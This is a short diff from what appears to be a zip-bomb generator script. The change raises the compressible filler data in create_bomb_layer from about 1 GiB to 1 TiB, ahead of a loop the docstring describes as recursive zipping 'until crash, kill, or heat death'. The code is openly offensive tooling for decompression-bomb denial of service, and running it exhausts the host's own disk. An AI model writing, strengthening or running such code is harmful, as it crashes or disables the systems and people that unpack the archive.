@@ -5,7 +5,7 @@ def create_bomb_layer(filename):
     """Creates an infinitely recursive zip file (until crash, kill, or heat death)."""
     # Base file to start compression chain
     with open("filler.txt", "wb") as f:
-        f.write(b"A" * 1024 * 1024 * 1024)  # 1MB * 1024 of compressible data
+        f.write(b"A" * 1024 * 1024 * 1024 * 1024)  # 1T of compressible data
 
     i = 0
     while True:
